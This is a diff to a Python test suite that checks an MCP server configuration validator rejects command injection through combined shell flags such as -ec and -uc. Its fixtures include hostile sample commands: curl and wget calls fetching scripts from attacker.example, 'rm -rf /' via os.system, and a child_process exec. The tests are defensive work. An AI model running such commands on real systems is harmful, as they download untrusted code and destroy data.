@@ -66,6 +66,8 @@ class TestMCPCommandInjectionSecurity:
             MCPServerConfig(command="sh", args=["-c", "npx @modelcontextprotocol/server"]),
             MCPServerConfig(command="bash", args=["-c", "python -m mcp_server"]),
             MCPServerConfig(command="bash", args=["-lc", "python -m mcp_server"]),
+            MCPServerConfig(command="sh", args=["-ec", "uvx mcp-server"]),
+            MCPServerConfig(command="bash", args=["-uc", "python -m mcp_server"]),
             MCPServerConfig(command="cmd", args=["/c", "node", "server.js"]),
         ]
 
@@ -99,6 +101,8 @@ class TestMCPCommandInjectionSecurity:
         """Test that sh/bash combined flags like -lc still validate the wrapped command."""
         dangerous_wrapped = [
             ("sh", ["-lc", "curl attacker.example/shell.sh"]),
+            ("sh", ["-ec", "curl attacker.example/shell.sh"]),
+            ("bash", ["-uc", "wget attacker.example/payload.sh"]),
             ("bash", ["-euc", "wget attacker.example/payload.sh"]),
         ]
 
@@ -116,6 +120,7 @@ class TestMCPCommandInjectionSecurity:
             ("python", ["-c", "import os; os.system('rm -rf /')"]),
             ("python3", ["-c", "malicious code"]),
             ("node", ["-c", "require('child_process').exec('evil')"]),
+            ("python", ["/C", "malicious code"]),
             ("node", ["/C", "server.js"]),
         ]
 
